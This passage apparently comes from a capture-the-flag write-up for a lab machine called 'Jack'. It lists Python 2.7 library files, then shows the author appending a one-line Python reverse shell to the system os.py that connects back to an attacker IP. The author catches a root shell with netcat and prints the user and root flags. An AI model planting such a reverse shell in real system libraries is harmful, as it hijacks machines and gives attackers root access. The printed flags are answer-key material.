/usr/lib/python2.7/sunaudio.py
/usr/lib/python2.7/distutils
/usr/lib/python2.7/base64.py
/usr/lib/python2.7/wave.pyc
/usr/lib/python2.7/UserString.py
/usr/lib/python2.7/pdb.py
/usr/lib/python2.7/mimify.pyc
/usr/lib/python2.7/locale.py
/usr/lib/python2.7/formatter.py
/usr/lib/python2.7/compileall.pyc
/usr/lib/python2.7/binhex.py
/usr/lib/python2.7/urllib2.pyc
/usr/lib/python2.7/re.pyc
/usr/lib/python2.7/whichdb.py
/usr/lib/python2.7/xml
/usr/lib/python2.7/markupbase.py
/usr/lib/python2.7/codeop.pyc
/usr/lib/python2.7/commands.pyc
/usr/lib/python2.7/cProfile.pyc
/usr/lib/python2.7/bsddb
/usr/lib/python2.7/pty.pyc
/usr/lib/python2.7/dis.py
/usr/lib/python2.7/uuid.pyc
/usr/lib/python2.7/sre_constants.py
/usr/lib/python2.7/ftplib.pyc
/usr/lib/python2.7/sre_parse.pyc
/usr/lib/python2.7/stringold.py
/usr/lib/python2.7/UserDict.pyc
/usr/lib/python2.7/imputil.py
/usr/lib/python2.7/sndhdr.py
/usr/lib/python2.7/fractions.py
/usr/lib/python2.7/copy.pyc
/usr/lib/python2.7/trace.pyc
/usr/lib/python2.7/pkgutil.pyc
/usr/lib/python2.7/functools.py
/usr/lib/python2.7/weakref.pyc
/usr/lib/python2.7/Cookie.pyc
/usr/lib/python2.7/runpy.pyc
/usr/lib/python2.7/tarfile.py
/usr/lib/python2.7/pickletools.py
/usr/lib/python2.7/BaseHTTPServer.pyc
/usr/lib/python2.7/sunau.pyc
/usr/lib/python2.7/os2emxpath.pyc
/usr/lib/python2.7/calendar.pyc
/usr/lib/python2.7/Queue.py
/usr/lib/python2.7/symbol.py
/usr/lib/python2.7/sha.pyc
/usr/lib/python2.7/warnings.pyc
/usr/lib/python2.7/htmllib.pyc
/usr/lib/python2.7/argparse.egg-info
/usr/lib/python2.7/whichdb.pyc
/usr/lib/python2.7/sre_compile.py
/usr/lib/python2.7/asynchat.py
/usr/lib/python2.7/pdb.pyc
/usr/lib/python2.7/mutex.pyc
/usr/lib/python2.7/anydbm.py
/usr/lib/python2.7/stat.pyc
/usr/lib/python2.7/imputil.pyc
/usr/lib/python2.7/__phello__.foo.pyc
/usr/lib/python2.7/sre_constants.pyc
/usr/lib/python2.7/ntpath.pyc
/usr/lib/python2.7/ensurepip
/usr/lib/python2.7/uu.pyc
/usr/lib/python2.7/_LWPCookieJar.py
/usr/lib/python2.7/sre.pyc
/usr/lib/python2.7/nturl2path.py
/usr/lib/python2.7/StringIO.py
/usr/lib/python2.7/warnings.py
/usr/lib/python2.7/user.py
/usr/lib/python2.7/compileall.py
/usr/lib/python2.7/htmllib.py
/usr/lib/python2.7/platform.py
/usr/lib/python2.7/pydoc.py
/usr/lib/python2.7/DocXMLRPCServer.py
/usr/lib/python2.7/cmd.pyc
/usr/lib/python2.7/socket.pyc
/usr/lib/python2.7/ftplib.py
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/_sysconfigdata.py
/usr/lib/python2.7/LICENSE.txt
/usr/lib/python2.7/mutex.py
/usr/lib/python2.7/argparse.pyc
/usr/lib/python2.7/filecmp.pyc
/usr/lib/python2.7/string.pyc
/usr/lib/python2.7/tty.py
/usr/lib/python2.7/platform.pyc
/usr/lib/python2.7/ctypes
/usr/lib/python2.7/os2emxpath.py
/usr/lib/python2.7/toaiff.py
/usr/lib/python2.7/calendar.py
/usr/lib/python2.7/pickletools.pyc
/usr/lib/python2.7/filecmp.py
/usr/lib/python2.7/repr.py
/usr/lib/python2.7/textwrap.pyc
/usr/lib/python2.7/markupbase.pyc
/usr/lib/python2.7/mimetools.py
/usr/lib/python2.7/re.py
/usr/lib/python2.7/shelve.py
/usr/lib/python2.7/smtplib.pyc
/usr/lib/python2.7/runpy.py
/usr/lib/python2.7/new.py
/usr/lib/python2.7/sets.py
/usr/lib/python2.7/hmac.pyc
/usr/lib/python2.7/hashlib.pyc
/usr/lib/python2.7/mimetypes.py
/usr/lib/python2.7/wsgiref
/usr/lib/python2.7/tabnanny.py
/usr/lib/python2.7/formatter.pyc
/usr/lib/python2.7/struct.py
/usr/lib/python2.7/urllib2.py
/usr/lib/python2.7/antigravity.py
/usr/lib/python2.7/HTMLParser.py
/usr/lib/python2.7/wave.py
/usr/lib/python2.7/linecache.py
/usr/lib/python2.7/sysconfig.py
/usr/lib/python2.7/_abcoll.pyc
/usr/lib/python2.7/asynchat.pyc
/usr/lib/python2.7/HTMLParser.pyc
/usr/lib/python2.7/audiodev.py
/usr/lib/python2.7/wsgiref.egg-info
/usr/lib/python2.7/mailbox.py
/usr/lib/python2.7/pprint.py
/usr/lib/python2.7/getopt.pyc
/usr/lib/python2.7/_weakrefset.py
/usr/lib/python2.7/xdrlib.pyc
/usr/lib/python2.7/asyncore.pyc
/usr/lib/python2.7/BaseHTTPServer.py
/usr/lib/python2.7/code.py
/usr/lib/python2.7/rexec.py
/usr/lib/python2.7/statvfs.py
/usr/lib/python2.7/_threading_local.pyc
/usr/lib/python2.7/genericpath.pyc
/usr/lib/python2.7/shutil.pyc
/usr/lib/python2.7/abc.py
/usr/lib/python2.7/keyword.pyc
/usr/lib/python2.7/dist-packages
/usr/lib/python2.7/mhlib.pyc
/usr/lib/python2.7/site.py
/usr/lib/python2.7/ntpath.py
/usr/lib/python2.7/dbhash.py
/usr/lib/python2.7/binhex.pyc
/usr/lib/python2.7/uu.py
/usr/lib/python2.7/types.py
/usr/lib/python2.7/sets.pyc
/usr/lib/python2.7/sched.py
/usr/lib/python2.7/atexit.pyc
/usr/lib/python2.7/sunaudio.pyc
/usr/lib/python2.7/netrc.pyc
/usr/lib/python2.7/dumbdbm.pyc
/usr/lib/python2.7/dumbdbm.py
/usr/lib/python2.7/code.pyc
/usr/lib/python2.7/sunau.py
/usr/lib/python2.7/nturl2path.pyc
/usr/lib/python2.7/lib-dynload
/usr/lib/python2.7/mailcap.pyc
/usr/lib/python2.7/gzip.py
/usr/lib/python2.7/token.py
/usr/lib/python2.7/cgi.py
/usr/lib/python2.7/pprint.pyc
/usr/lib/python2.7/rexec.pyc
/usr/lib/python2.7/nntplib.py
/usr/lib/python2.7/logging
/usr/lib/python2.7/tokenize.pyc
/usr/lib/python2.7/cgitb.pyc
/usr/lib/python2.7/user.pyc
/usr/lib/python2.7/tty.pyc
/usr/lib/python2.7/new.pyc
/usr/lib/python2.7/SimpleHTTPServer.py
/usr/lib/python2.7/encodings
/usr/lib/python2.7/CGIHTTPServer.py
/usr/lib/python2.7/threading.py
/usr/lib/python2.7/chunk.py
/usr/lib/python2.7/gettext.py
/usr/lib/python2.7/stringprep.pyc
/usr/lib/python2.7/robotparser.py
/usr/lib/python2.7/pipes.pyc
/usr/lib/python2.7/linecache.pyc
/usr/lib/python2.7/fnmatch.pyc
/usr/lib/python2.7/ssl.py
/usr/lib/python2.7/importlib
/usr/lib/python2.7/macurl2path.py
/usr/lib/python2.7/genericpath.py
/usr/lib/python2.7/textwrap.py
/usr/lib/python2.7/fileinput.py
/usr/lib/python2.7/multiprocessing
/usr/lib/python2.7/mimify.py
/usr/lib/python2.7/pstats.py
/usr/lib/python2.7/ConfigParser.py
/usr/lib/python2.7/pickle.pyc
/usr/lib/python2.7/cgitb.py
/usr/lib/python2.7/timeit.py
/usr/lib/python2.7/sched.pyc
/usr/lib/python2.7/bisect.py
/usr/lib/python2.7/abc.pyc
/usr/lib/python2.7/heapq.pyc
/usr/lib/python2.7/pdb.doc
/usr/lib/python2.7/aifc.py
/usr/lib/python2.7/__future__.py
/usr/lib/python2.7/socket.py
/usr/lib/python2.7/glob.py
/usr/lib/python2.7/tabnanny.pyc
/usr/lib/python2.7/modulefinder.pyc
/usr/lib/python2.7/shlex.pyc
/usr/lib/python2.7/io.pyc
/usr/lib/python2.7/sgmllib.py
/usr/lib/python2.7/mimetools.pyc
/usr/lib/python2.7/dummy_thread.py
/usr/lib/python2.7/traceback.py
/usr/lib/python2.7/__future__.pyc
/usr/lib/python2.7/py_compile.pyc
/usr/lib/python2.7/CGIHTTPServer.pyc
/usr/lib/python2.7/decimal.py
/usr/lib/python2.7/pickle.py
/usr/lib/python2.7/httplib.pyc
/usr/lib/python2.7/curses
/usr/lib/python2.7/numbers.pyc
/usr/lib/python2.7/md5.pyc
/usr/lib/python2.7/symtable.pyc
/usr/lib/python2.7/imaplib.py
/usr/lib/python2.7/atexit.py
/usr/lib/python2.7/numbers.py
/usr/lib/python2.7/imghdr.py
/usr/lib/python2.7/SimpleXMLRPCServer.py
/usr/lib/python2.7/hashlib.py
/usr/lib/python2.7/colorsys.py
/usr/lib/python2.7/copy.py
/usr/lib/python2.7/mailcap.py
/usr/lib/python2.7/nntplib.pyc
/usr/lib/python2.7/pydoc.pyc
/usr/lib/python2.7/csv.pyc
/usr/lib/python2.7/macpath.py
/usr/lib/python2.7/py_compile.py
/usr/lib/python2.7/rfc822.py
/usr/lib/python2.7/imaplib.pyc
/usr/lib/python2.7/quopri.py
/usr/lib/python2.7/contextlib.pyc
/usr/lib/python2.7/md5.py
/usr/lib/python2.7/UserList.pyc
/usr/lib/python2.7/stat.py
/usr/lib/python2.7/pyclbr.py
/usr/lib/python2.7/profile.pyc
/usr/lib/python2.7/xmllib.pyc
/usr/lib/python2.7/_abcoll.py
/usr/lib/python2.7/profile.py
/usr/lib/python2.7/xmlrpclib.py
/usr/lib/python2.7/audiodev.pyc
/usr/lib/python2.7/urlparse.pyc
/usr/lib/python2.7/_weakrefset.pyc
/usr/lib/python2.7/UserString.pyc
/usr/lib/python2.7/subprocess.pyc
/usr/lib/python2.7/functools.pyc
/usr/lib/python2.7/urllib.pyc
/usr/lib/python2.7/UserDict.py
/usr/lib/python2.7/subprocess.py
/usr/lib/python2.7/difflib.pyc
/usr/lib/python2.7/commands.py
/usr/lib/python2.7/htmlentitydefs.py
/usr/lib/python2.7/zipfile.py
/usr/lib/python2.7/poplib.py
/usr/lib/python2.7/sysconfig.pyc
/usr/lib/python2.7/xmlrpclib.pyc
/usr/lib/python2.7/json
/usr/lib/python2.7/pyclbr.pyc
/usr/lib/python2.7/dummy_threading.pyc
/usr/lib/python2.7/MimeWriter.py
/usr/lib/python2.7/MimeWriter.pyc
/usr/lib/python2.7/robotparser.pyc
/usr/lib/python2.7/dummy_threading.py
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/shlex.py
/usr/lib/python2.7/SimpleHTTPServer.pyc
/usr/lib/python2.7/inspect.py
/usr/lib/python2.7/decimal.pyc
/usr/lib/python2.7/symbol.pyc
/usr/lib/python2.7/base64.pyc
/usr/lib/python2.7/keyword.py
/usr/lib/python2.7/dummy_thread.pyc
/usr/lib/python2.7/dis.pyc
/usr/lib/python2.7/_LWPCookieJar.pyc
/usr/lib/python2.7/locale.pyc
/usr/lib/python2.7/trace.py
/usr/lib/python2.7/io.py
/usr/lib/python2.7/_MozillaCookieJar.py
/usr/lib/python2.7/_strptime.py
/usr/lib/python2.7/fractions.pyc
/usr/lib/python2.7/compiler
/usr/lib/python2.7/getpass.py
/usr/lib/python2.7/gzip.pyc
/usr/lib/python2.7/sndhdr.pyc
/usr/lib/python2.7/random.pyc
/usr/lib/python2.7/lib2to3
/usr/lib/python2.7/collections.py
/usr/lib/python2.7/codecs.py
/usr/lib/python2.7/tempfile.pyc
/usr/lib/python2.7/webbrowser.py
/usr/lib/python2.7/popen2.pyc
/usr/lib/python2.7/urlparse.py
/usr/lib/python2.7/opcode.py
/usr/lib/python2.7/dbhash.pyc
/usr/lib/python2.7/optparse.pyc
/usr/lib/python2.7/fileinput.pyc
/usr/lib/python2.7/fpformat.pyc
/usr/lib/python2.7/gettext.pyc
/usr/lib/python2.7/toaiff.pyc
/usr/lib/python2.7/rlcompleter.py
/usr/lib/python2.7/sre.py
/usr/lib/python2.7/codecs.pyc
/usr/lib/python2.7/this.pyc
/usr/lib/python2.7/unittest
/usr/lib/python2.7/sre_compile.pyc
/usr/lib/python2.7/types.pyc
/usr/lib/python2.7/optparse.py
/usr/lib/python2.7/mhlib.py
/usr/lib/python2.7/cProfile.py
/usr/lib/python2.7/ast.pyc
/usr/lib/python2.7/UserList.py
/usr/lib/python2.7/cookielib.py
/usr/lib/python2.7/SocketServer.pyc
/usr/lib/python2.7/aifc.pyc
/usr/lib/python2.7/sha.py
/usr/lib/python2.7/pstats.pyc
/usr/lib/python2.7/ast.py
/usr/lib/python2.7/ihooks.py
/usr/lib/python2.7/stringold.pyc
/usr/lib/python2.7/token.pyc
/usr/lib/python2.7/copy_reg.pyc
/usr/lib/python2.7/telnetlib.pyc
/usr/lib/python2.7/pydoc_data
/usr/lib/python2.7/__phello__.foo.py
/usr/lib/python2.7/xmllib.py
/usr/lib/python2.7/bdb.pyc
/usr/lib/python2.7/ConfigParser.pyc
/usr/lib/python2.7/chunk.pyc
/usr/lib/python2.7/StringIO.pyc
/usr/lib/python2.7/site.pyc
/usr/lib/python2.7/_strptime.pyc
/usr/lib/python2.7/this.py
/usr/lib/python2.7/imghdr.pyc
/usr/lib/python2.7/mailbox.pyc
/usr/lib/python2.7/email
/usr/lib/python2.7/random.py
/usr/lib/python2.7/doctest.py
/usr/lib/python2.7/antigravity.pyc
/usr/lib/python2.7/Queue.pyc
/usr/lib/python2.7/string.py
/usr/lib/python2.7/pkgutil.py
/usr/lib/python2.7/colorsys.pyc
/usr/lib/python2.7/Bastion.py
/usr/lib/python2.7/_MozillaCookieJar.pyc
/usr/lib/python2.7/netrc.py
/usr/lib/python2.7/tokenize.py
/usr/lib/python2.7/urllib.py
/usr/lib/python2.7/getopt.py
/usr/lib/python2.7/poplib.pyc
/usr/lib/python2.7/_osx_support.py
/usr/lib/python2.7/cgi.pyc
/usr/lib/python2.7/difflib.py
/usr/lib/python2.7/statvfs.pyc
/usr/lib/python2.7/macurl2path.pyc
/usr/lib/python2.7/glob.pyc
/usr/lib/python2.7/opcode.pyc
/usr/lib/python2.7/quopri.pyc
/usr/lib/python2.7/sqlite3
/usr/lib/python2.7/argparse.py
/usr/lib/python2.7/httplib.py
/usr/lib/python2.7/DocXMLRPCServer.pyc
/usr/lib/python2.7/tarfile.pyc
/usr/lib/python2.7/sre_parse.py
/usr/lib/python2.7/timeit.pyc
/usr/lib/python2.7/mimetypes.pyc
/usr/lib/python2.7/sitecustomize.pyc
/usr/lib/python2.7/_pyio.pyc
/usr/lib/python2.7/shelve.pyc
/usr/lib/python2.7/_osx_support.pyc
/usr/lib/python2.7/multifile.py
/usr/lib/python2.7/threading.pyc
/usr/lib/python2.7/cookielib.pyc
/usr/lib/python2.7/codeop.py
/usr/lib/python2.7/traceback.pyc
/usr/lib/python2.7/asyncore.py
/usr/lib/python2.7/popen2.py
/usr/lib/python2.7/zipfile.pyc
/usr/lib/python2.7/doctest.pyc
/usr/lib/python2.7/getpass.pyc
/usr/lib/python2.7/smtplib.py
/etc/python2.7/sitecustomize.py

jack@jack:/opt/statuscheck$ cd /usr/lib/python2.7/
jack@jack:/usr/lib/python2.7$ ls
_abcoll.py          dis.py               macpath.py             py_compile.py           sunaudio.pyc
_abcoll.pyc         dis.pyc              macpath.pyc            py_compile.pyc          sunau.py
abc.py              dist-packages        macurl2path.py         pydoc_data              sunau.pyc
abc.pyc             distutils            macurl2path.pyc        pydoc.py                symbol.py
aifc.py             doctest.py           mailbox.py             pydoc.pyc               symbol.pyc
aifc.pyc            doctest.pyc          mailbox.pyc            _pyio.py                symtable.py
antigravity.py      DocXMLRPCServer.py   mailcap.py             _pyio.pyc               symtable.pyc
antigravity.pyc     DocXMLRPCServer.pyc  mailcap.pyc            Queue.py                _sysconfigdata.py
anydbm.py           dumbdbm.py           markupbase.py          Queue.pyc               _sysconfigdata.pyc
anydbm.pyc          dumbdbm.pyc          markupbase.pyc         quopri.py               sysconfig.py
argparse.egg-info   dummy_threading.py   md5.py                 quopri.pyc              sysconfig.pyc
argparse.py         dummy_threading.pyc  md5.pyc                random.py               tabnanny.py
argparse.pyc        dummy_thread.py      mhlib.py               random.pyc              tabnanny.pyc
ast.py              dummy_thread.pyc     mhlib.pyc              repr.py                 tarfile.py
ast.pyc             email                mimetools.py           repr.pyc                tarfile.pyc
asynchat.py         encodings            mimetools.pyc          re.py                   telnetlib.py
asynchat.pyc        ensurepip            mimetypes.py           re.pyc                  telnetlib.pyc
asyncore.py         filecmp.py           mimetypes.pyc          rexec.py                tempfile.py
asyncore.pyc        filecmp.pyc          MimeWriter.py          rexec.pyc               tempfile.pyc
atexit.py           fileinput.py         MimeWriter.pyc         rfc822.py               test
atexit.pyc          fileinput.pyc        mimify.py              rfc822.pyc              textwrap.py
audiodev.py         fnmatch.py           mimify.pyc             rlcompleter.py          textwrap.pyc
audiodev.pyc        fnmatch.pyc          modulefinder.py        rlcompleter.pyc         this.py
base64.py           formatter.py         modulefinder.pyc       robotparser.py          this.pyc
base64.pyc          formatter.pyc        _MozillaCookieJar.py   robotparser.pyc         _threading_local.py
BaseHTTPServer.py   fpformat.py          _MozillaCookieJar.pyc  runpy.py                _threading_local.pyc
BaseHTTPServer.pyc  fpformat.pyc         multifile.py           runpy.pyc               threading.py
Bastion.py          fractions.py         multifile.pyc          sched.py                threading.pyc
Bastion.pyc         fractions.pyc        multiprocessing        sched.pyc               timeit.py
bdb.py              ftplib.py            mutex.py               sets.py                 timeit.pyc
bdb.pyc             ftplib.pyc           mutex.pyc              sets.pyc                toaiff.py
binhex.py           functools.py         netrc.py               sgmllib.py              toaiff.pyc
binhex.pyc          functools.pyc        netrc.pyc              sgmllib.pyc             tokenize.py
bisect.py           __future__.py        new.py                 sha.py                  tokenize.pyc
bisect.pyc          __future__.pyc       new.pyc                sha.pyc                 token.py
bsddb               genericpath.py       nntplib.py             shelve.py               token.pyc
calendar.py         genericpath.pyc      nntplib.pyc            shelve.pyc              traceback.py
calendar.pyc        getopt.py            ntpath.py              shlex.py                traceback.pyc
CGIHTTPServer.py    getopt.pyc           ntpath.pyc             shlex.pyc               trace.py
CGIHTTPServer.pyc   getpass.py           nturl2path.py          shutil.py               trace.pyc
cgi.py              getpass.pyc          nturl2path.pyc         shutil.pyc              tty.py
cgi.pyc             gettext.py           numbers.py             SimpleHTTPServer.py     tty.pyc
cgitb.py            gettext.pyc          numbers.pyc            SimpleHTTPServer.pyc    types.py
cgitb.pyc           glob.py              opcode.py              SimpleXMLRPCServer.py   types.pyc
chunk.py            glob.pyc             opcode.pyc             SimpleXMLRPCServer.pyc  unittest
chunk.pyc           gzip.py              optparse.py            sitecustomize.py        urllib2.py
cmd.py              gzip.pyc             optparse.pyc           sitecustomize.pyc       urllib2.pyc
cmd.pyc             hashlib.py           os2emxpath.py          site.py                 urllib.py
codecs.py           hashlib.pyc          os2emxpath.pyc         site.pyc                urllib.pyc
codecs.pyc          heapq.py             os.py                  smtpd.py                urlparse.py
codeop.py           heapq.pyc            os.pyc                 smtpd.pyc               urlparse.pyc
codeop.pyc          hmac.py              _osx_support.py        smtplib.py              UserDict.py
code.py             hmac.pyc             _osx_support.pyc       smtplib.pyc             UserDict.pyc
code.pyc            hotshot              pdb.doc                sndhdr.py               UserList.py
collections.py      htmlentitydefs.py    pdb.py                 sndhdr.pyc              UserList.pyc
collections.pyc     htmlentitydefs.pyc   pdb.pyc                socket.py               user.py
colorsys.py         htmllib.py           __phello__.foo.py      socket.pyc              user.pyc
colorsys.pyc        htmllib.pyc          __phello__.foo.pyc     SocketServer.py         UserString.py
commands.py         HTMLParser.py        pickle.py              SocketServer.pyc        UserString.pyc
commands.pyc        HTMLParser.pyc       pickle.pyc             sqlite3                 uuid.py
compileall.py       httplib.py           pickletools.py         sre_compile.py          uuid.pyc
compileall.pyc      httplib.pyc          pickletools.pyc        sre_compile.pyc         uu.py
compiler            ihooks.py            pipes.py               sre_constants.py        uu.pyc
ConfigParser.py     ihooks.pyc           pipes.pyc              sre_constants.pyc       warnings.py
ConfigParser.pyc    imaplib.py           pkgutil.py             sre_parse.py            warnings.pyc
contextlib.py       imaplib.pyc          pkgutil.pyc            sre_parse.pyc           wave.py
contextlib.pyc      imghdr.py            platform.py            sre.py                  wave.pyc
cookielib.py        imghdr.pyc           platform.pyc           sre.pyc                 weakref.py
cookielib.pyc       importlib            plat-x86_64-linux-gnu  ssl.py                  weakref.pyc
Cookie.py           imputil.py           plistlib.py            ssl.pyc                 _weakrefset.py
Cookie.pyc          imputil.pyc          plistlib.pyc           stat.py                 _weakrefset.pyc
copy.py             inspect.py           popen2.py              stat.pyc                webbrowser.py
copy.pyc            inspect.pyc          popen2.pyc             statvfs.py              webbrowser.pyc
copy_reg.py         io.py                poplib.py              statvfs.pyc             whichdb.py
copy_reg.pyc        io.pyc               poplib.pyc             StringIO.py             whichdb.pyc
cProfile.py         json                 posixfile.py           StringIO.pyc            wsgiref
cProfile.pyc        keyword.py           posixfile.pyc          stringold.py            wsgiref.egg-info
csv.py              keyword.pyc          posixpath.py           stringold.pyc           xdrlib.py
csv.pyc             lib2to3              posixpath.pyc          stringprep.py           xdrlib.pyc
ctypes              lib-dynload          pprint.py              stringprep.pyc          xml
curses              lib-tk               pprint.pyc             string.py               xmllib.py
dbhash.py           LICENSE.txt          profile.py             string.pyc              xmllib.pyc
dbhash.pyc          linecache.py         profile.pyc            _strptime.py            xmlrpclib.py
decimal.py          linecache.pyc        pstats.py              _strptime.pyc           xmlrpclib.pyc
decimal.pyc         locale.py            pstats.pyc             struct.py               zipfile.py
difflib.py          locale.pyc           pty.py                 struct.pyc              zipfile.pyc
difflib.pyc         logging              pty.pyc                subprocess.py
dircache.py         _LWPCookieJar.py     pyclbr.py              subprocess.pyc
dircache.pyc        _LWPCookieJar.pyc    pyclbr.pyc             sunaudio.py


jack@jack:/usr/lib/python2.7$ nano os.py

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")


    
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337                                     
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.12.106.
Ncat: Connection from 10.10.12.106:44780.
root@jack:~# cd /root
cd /root
root@jack:~# ls
ls
root.txt
root@jack:~# cat root.txt
cat root.txt
b8b63a861cc09e853f29d8055d64bffb


```

![[Pasted image 20230118143030.png]]

Gain initial access and obtain the user flag.

Wpscan user enumeration, and don't use tools (ure_other_roles)

*0052f7829e48752f2e7bf50f1231548a*

Escalate your privileges to root. Whats the root flag?

Python

*b8b63a861cc09e853f29d8055d64bffb*


[[Sigma]]